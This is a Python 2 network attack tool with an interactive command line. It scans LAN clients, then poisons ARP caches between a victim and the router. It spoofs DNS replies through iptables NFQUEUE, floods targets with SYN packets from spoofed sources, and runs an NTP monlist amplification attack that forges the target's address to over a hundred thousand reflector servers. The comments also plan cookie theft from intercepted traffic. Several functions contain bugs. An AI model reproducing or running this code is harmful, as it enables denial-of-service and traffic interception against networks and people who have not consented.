#!/usr/bin/env python
######################################
#
#   Author: mtarsel
#
#   PACKAGES INCLUDE: 
#	python-nmap, nfeque, scapy, netaddr
#
#   LICENSE: GPL v2
#
######################################



#1. Find all routers 
#2. Search all clients on router and obtain IP Address and MAC Address
#3. ARP Poison victimIP Address from routerIP Address
#4. Redirect all traffic to different domain using DNS queriers and redirection

#Redirect all clients on LAN to specific IP ddress,
#Use  NTP as amplification??

#psuedocode:

#for IPAddress.clientList(): #PARSE IP and MAC Address
#    poision(vicimtIP->IP.clientLiast())
#    redirect.from(IP.clientList())
#    redirect.to(targetIP)
#    amplify()

#def amplify():
#    all clients send DNS query 
#        or 
#            all clients use NTP server to send more traffic

#NOTES:
#-whilenpoisioning, save all traffic to parse later 
#    -grab cookies??
# heartbleed?




import socket, random, sys, threading
import cmd
import logging
import string, sys
from scapy.all import *
import nmap   
import time
from subprocess import call
from netaddr import *
import getpass

from twisted.internet import reactor
from twisted.internet.interfaces import IReadDescriptor
import os
#import nfqueue
import signal


clientsList = [ ]

global myip

#ntp stuff
ntplist = [ ]
global currentserver
global data


yes = set(['yes','y', 'ye', 'Y','YE','YES','yea', 'yeah', 'oui', ''])
no = set(['no','n', 'No', 'NO', 'non', 'nah'])



class Queued(object):
    def __init__(self):
        self.q = nfqueue.queue()
        self.q.set_callback(cb)
        self.q.fast_open(0, socket.AF_INET)
        self.q.set_queue_maxlen(5000)
        reactor.addReader(self)
        self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
        print '[*] Waiting for data'
    def fileno(self):
        return self.q.get_fd()
    def doRead(self):
        self.q.process_pending(100)
    def connectionLost(self, reason):
        reactor.removeReader(self)
    def logPrefix(self):
        return 'queue'


#choice = raw_input().lower()
def yesorno(choice):
    if choice in yes:
	return True
    elif choice in no:
	return False
    else:
	sys.stdout.write("Please respond with 'yes' or 'no'")



#packet sender
def deny(ntplist, currentserver, targetIP, data):
    #Import globals to function
    ntpserver = ntplist[currentserver] #Get new server
    currentserver = currentserver + 1 #Increment for next 
    packet = IP(dst=ntpserver,src=targetIP)/UDP(sport=48947,dport=123)/Raw(load=data) #BUILD IT
    send(packet,loop=1) #SEND IT


#usng the ol' ntp amplification. shit should be patched but why not try?
def amplify(targetIP):
    #https://github.com/vpnguy/ntpdos
#by DaRkReD


    #128437 ntp servers in txt file
    numOfServers = 128437

    numberthreads = numOfServers
   
 

    #System for accepting bulk input
    ntplist = []
    currentserver = 0
    with open("ntp-servers.txt") as f:
	ntplist = f.readlines()

    #Make sure we dont out of bounds
    if  numberthreads > int(len(ntplist)):
	print "Attack Aborted: More threads than servers"
	print "Next time dont create more threads than servers"
	exit(0)

    #Magic Packet aka NTP v2 Monlist Packet
    data = "\x17\x00\x03\x2a" + "\x00" * 4

    #Hold our threads
    threads = []
    print "Starting to flood: "+ targetIP + " using ntp-servers.txt  With " + str(numberthreads) + " threads"
    print "Use CTRL+C to stop attack"

    #Thread spawner
    for n in range(numberthreads):
	thread = threading.Thread(target=deny(ntplist, currentserver, targetIP, data))
	thread.daemon = True
	thread.start()

	threads.append(thread)

    #In progress!
    print "Sending..."

    #Keep alive so ctrl+c still kills all them threads
    while True:
        time.sleep(1)


def cb(payload):
    data = payload.get_data()
    pkt = IP(data)
    localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
    if not pkt.haslayer(DNSQR):
        payload.set_verdict(nfqueue.NF_ACCEPT)
    else:
        if arg_parser().spoofall:
            if not arg_parser().redirectto:
                spoofed_pkt(payload, pkt, localIP)
            else:
                spoofed_pkt(payload, pkt, arg_parser().redirectto)
        if arg_parser().domain:
            if arg_parser().domain in pkt[DNS].qd.qname:
                if not arg_parser().redirectto:
                    spoofed_pkt(payload, pkt, localIP)
                else:
                    spoofed_pkt(payload, pkt, arg_parser().redirectto)




	

def arp_monitor_callback(pkt):
    if ARP in pkt and pkt[ARP].op in (1,2): #who-has or is-at   
	clients = pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")
	clients = clientsList.append(clients)
	sortedclientsList = sorted(set(clientsList))
	
	print "Number of clients: ", len(sortedclientsList)
	file = open("client-list.txt", "w")
	for x in sortedclientsList:
	    #18 to end should be ip
	    parsedIP = x[18:]
	    if(parsedIP == myip):
		print (x + " (YOUR IP) \n")
		file.write(x + " (YOUR IP) \n")
	    else:
		print  x
		file.write(x + "\n")
	print "\nUpdated client list in client-list.txt\n"
	file.close()
	 
	
class Arp:
#    def __init__(self, victim 
    def __init__(self, routerIP, victimIP, routerMAC, victimMAC):
	self.routerIP = routerIP
	self.victimIP = victimIP
	self.routerMAC = routerMAC
	self.victimMAC = victimMAC

    def originalMAC(ip):
        ans,unans = srp(ARP(pdst=ip), timeout=5, retry=3)
        for s,r in ans:
            return r[Ether].src
        
    def poison(self, routerIP, victimIP, routerMAC, victimMAC):
        send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst=self.victimMAC))#TODO error
        send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst=self.routerMAC))
    
    def restore(routerIP, victimIP, routerMAC, victimMAC):
        send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victimMAC), count=3)
        send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.routerMAC), count=3)
        sys.exit("losing...")    

   # def signal_handler(signal, frame):
   #     with ipf as open('/proc/sys/net/ipv4/ip_forward', 'w'):#TODO compile error
   #         ipf.write('0\n')#disable IP forwarding
        restore(self.routerIP, self.victimIP, self.routerMAC, self.victimMAC)
        

class sendSYN(threading.Thread):
        def __init__(self, targetip, port):
                threading.Thread.__init__(self)
		self.targetip = targetip
		self.port = port
	
        def run(self):
                i = IP()
                i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
                i.dst = self.targetip

                t = TCP()
                t.sport = random.randint(1,65535)
                t.dport = self.port
                t.flags = 'S'

                send(i/t, verbose=0)

class CLI(cmd.Cmd):

    def __init__(self):
        cmd.Cmd.__init__(self)
	#username = getpass.getuser()
	hostname = socket.gethostname()
        self.prompt = 'banshee@' + hostname + '~#'
        
        

    def do_netiface(self, arg):
	"""Takes no arguments	
	    View and/or change your Network Interface Card"""
	
	print "\nChange it? [y/n]"
	choice = raw_input().lower()
		
	if yesorno(choice) is True:
	    call(["ip", "address"])#TODO use pip package netifaces?? 
	    print "\nCurrent: ", conf.iface
	    conf.iface = raw_input("Enter network interface: ")  
	    
	    
	 
    def do_ip(self, arg):
	"""Takes no arguments
	Gets your IP address"""
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(('8.8.8.8', 80))
	myip = (s.getsockname()[0])
	print "Your ip: ", myip
	
	

    def do_clientlist(self, arg):
	"""Takes no arguments.
	    Prints list of clientsList and MAC and IP addresses
	    on LAN"""
	#TODO split entires in the list by ip and mac
	    # check if ip address is our ip and display some kinda flag so user knows
	sortedclientsList = sorted(set(clientsList))
	print "Number of clients: ", len(sortedclientsList)
	#file = open("client-list.txt", "w")
	for x in sortedclientsList:
	    parsedIP = x[18:]
	    if(parsedIP == myip):
		print "\n" + x + " YOUR IP"
	    else:
		print "\n", x
	#    file.write(x + "\n")
#	print "Outputting list to client-list.txt"
#	file.close()
	 

    def do_clients(self, arg):
	""" Takes no arguments 
	View clients connected to router
	clients """

	#Same command as: nmap -sP 192.168.1.1/24
	#TODO make background job and quit after certain amount of time
	print "Pinging clients... \n"
	sniff(prn=arp_monitor_callback, filter="arp", store=0)  
    
	
	
	
    def do_router(self, arg):
	"""Takes no arguments.
	    Executes arp -a 
	    Should be address of router"""
	call(["arp", "-a"]) 	    


    def do_ping(self, arg):
	"""ping [host IP address] [count] 
	    Pings IP address"""
	if not(arg):
	    print "No ip entered"
	    print "ping [host IP address] [count] \n"
	else:
	    print "\nPinging... ",arg,"\n"
	    pingIP = str(IPAddress(arg))
	    if(pingIP == myip):
		print "\n That is your IP address dude. \n"
	    else:
		pingr = IP(dst=pingIP)/ICMP()
		sr1(pingr)

    def do_kick(self, arg):
	"""kick 
	    #########################################
	    #
	    # Kick everyone off wifi with DeAuth packets
	    # author: Dan McInerney
	    #
	    #########################################

	    http://danmcinerney.org/how-to-kick-everyone-around-you-off-wifi-with-python/"""



    def do_arp(self, arg):
	"""arp [routerIP] [victimIP] [routerMAC] [victimMAC]
	    #########################################
	    # 
	    # ARP Poison 
	    # author: Dan McInerney
	    #
	    #########################################

	    http://danmcinerney.org/arp-poisoning-with-python-2/ """
	
	arplist = arg.split(" ")
    
	if len(arplist) < 4:
	    print "\n Error, not enough args \n"
	else:
	    print"Enabling IP forwarding...\n"
    
	    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
		ipf.write('1\n')#enable IP forwarding with '1'     
	    #signal.signal(signal.SIGINT, signal_handler)
	    
	    routerIP = str(IPAddress(arplist[0]))
	    victimIP = str(IPAddress(arplist[1]))	    
	    routerMAC = str(IPAddress(arplist[2]))
	    victimMAC = str(IPAddress(arplist[3]))

	       
	    arpAttack = Arp(routerIP, victimIP, routerMAC, victimMAC)       

	    while 1:
		try:
		    arpAttack.poison(arpAttack.routerIP, arpAttack.victimIP, arpAttack.routerMAC, arpAttack.victimMAC)
		    time.sleep(1.5)
		except KeyboardInterrupt:
		    print "\n"
		    break
	       
	
    def do_dns(self, arg):
	"""
	dns [routerIP] [victimIP] [routerMAC] [victimMAC]
    #########################################
    # 
    # DNS Poisioning
    # author: Dan McInerary
    #http://danmcinerney.org/reliable-dns-spoofing-with-python-twisting-in-arp-poisoning-pt-2/
    #########################################
	    """	
	
	arplist = arg.split(" ")
    
	if len(arplist) < 4:
	    print "\n Error, not enough args \n"
	    print "dns [routerIP] [victimIP] [routerMAC] [victimMAC]\n"
	else:
	    print"Enabling IP forwarding...\n"

	    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')   
 
	    ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
	    ipf_read = ipf.read()
	    if ipf_read != '1\n':
		ipf.write('1\n')
	    ipf.close()


	    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
		ipf.write('1\n')#enable IP forwarding with '1'     
	    #signal.signal(signal.SIGINT, signal_handler)
	    
	    routerIP = str(IPAddress(arplist[0]))
	    victimIP = str(IPAddress(arplist[1]))	    
	    routerMAC = str(IPAddress(arplist[2]))
	    victimMAC = str(IPAddress(arplist[3]))

	       
	    arpAttack = Arp(routerIP, victimIP, routerMAC, victimMAC)       

	    Queued()
	    rctr = threading.Thread(target=reactor.run, args=(False,))
	    rctr.daemon = True
	    rctr.start()

	    def signal_handler(signal, frame):
		print 'learing iptables, sending healing packets, and turning off IP forwarding...'
		with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward: 
		    forward.write(ipf_read)
		restore(routerIP, victimIP, routerMAC, victimMAC)
		restore(routerIP, victimIP, routerMAC, victimMAC)
		os.system('/sbin/iptables -F')
	        os.system('/sbin/iptables -X')
		os.system('/sbin/iptables -t nat -F')
	        os.system('/sbin/iptables -t nat -X')
		sys.exit(0)
	
	    signal.signal(signal.SIGINT, signal_handler)


	    while 1:
		try:
		    arpAttack.poison(arpAttack.routerIP, arpAttack.victimIP, arpAttack.routerMAC, arpAttack.victimMAC)
		    time.sleep(1.5)
		except KeyboardInterrupt:
		    print "\n"
		    break
	       


	
    def do_syn(self, arg):
	"""syn [target ip] [port]
    #########################################
    # 
    # SYNflood - A multithreaded SYN Flooder
    # author: arthurnn
    #
    #########################################

	   SYN flood: https://github.com/arthurnn/SynFlood  
	    """
	if not(arg):
	    print "No ip entered"
	    print "syn [target ip] [port]\n"
	else:

	    print "\n",arg,"\n"
	    targetlist = arg.split(" ")
	    targetip = str(IPAddress(targetlist[0]))
	    port = int(targetlist[1])	
	    print "Flooding %s:%i with SYN packets." % (targetlist[0], port)
	
	    total = 0

	    while 1:
		try:
		    syner = sendSYN(targetip, port)
		    syner.start()
#		    amplify(targetip)
		    total += 1
		    sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
		except KeyboardInterrupt:
		    print "\n"
		    break
	

    def do_quit(self, arg):
        sys.exit(1)

    def help_quit(self):
        print "syntax: quit",
        print "-- terminates the application"

    # shortcuts
    do_q = do_quit
    do_c = do_clients
    do_cl = do_clientlist
    do_net = do_netiface
    do_neti = do_netiface
    do_p = do_ping
    do_r = do_router

if __name__ == '__main__':
    
    #Remove Scapy warning about IPv6
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")
    
#    os.spawnl(os.P_DETACH, sniff(prn=arp_monitor_callback, filter="arp",store=0))
      
    call(["ip", "address"])#TODO use pip package netifaces?? 
 
    conf.iface = raw_input("\nEnter network interface: ")  

    #hackish - ping Google and get our IP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    myip = (s.getsockname()[0])
    print "\n Your network interface: ", conf.iface
    print "\n Your IP address: ", myip
    s.close()

    print"\n Type 'help' \n"
    cli = CLI()#define cmd Object
    cli.cmdloop() #begin infinite loop
